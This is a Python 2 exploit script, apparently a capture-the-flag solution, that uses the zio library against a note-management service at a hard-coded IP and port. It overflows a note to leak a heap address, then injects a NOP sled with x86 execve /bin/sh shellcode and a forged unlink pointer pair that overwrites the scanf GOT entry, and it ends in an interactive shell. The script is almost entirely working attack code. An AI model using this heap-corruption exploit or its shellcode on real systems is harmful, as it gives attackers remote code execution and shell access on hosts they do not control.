from zio import *

host = "133.130.90.210"
port = 6666

target = (host,port)

io = zio(target,timeout=100000,print_read=COLORED(REPR,"yellow"),\
	print_write=COLORED(REPR,"red"))

raw_input()

def add_note():
	io.read_until("Your Choice:\n")
	io.writeline("1")
	io.read_until("Give the type of the Girl:\n")
	io.writeline("1")

def del_note(v):
	io.read_until("Your Choice:\n")
	io.writeline("2")
	io.read_until("Give the Girl id to delete:\n")
	io.writeline(v[0])

def edit_note(v):
	io.read_until("Your Choice:\n")
	io.writeline("3")
	io.read_until("Give the Girl id to edit:\n")
	io.writeline(v[0])
	io.read_until("Give the type to edit:")
	io.writeline(v[1])
	io.read_until("Give your Girl:\n")
	io.writeline(v[2])

def show_note(v):
	io.read_until("Your Choice:\n")
	io.writeline("4")
	io.read_until("Give the Girlid to print:\n")
	io.writeline(v[0])


add_note()
add_note()

payload1 = "s"*212 + "bbb"

v1 = ["0","2",payload1]
edit_note(v1)

v2 = ["0"]
show_note(v2)

io.read_until("bbb\n")

data = io.read(8)[:4]

add_note()
add_note()

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";


scanf_plt = 0x804b024
shellcode_addr = l32(data)-0xd0

print hex(shellcode_addr)

payload2  = "\x90"*(212-len(shellcode))
payload2 += shellcode
payload2 += l32(scanf_plt-0x8)
payload2 += l32(shellcode_addr)

v3 = ["2","2",payload2]
edit_note(v3)

v4 = ["3"]
del_note(v4)

io.interact()


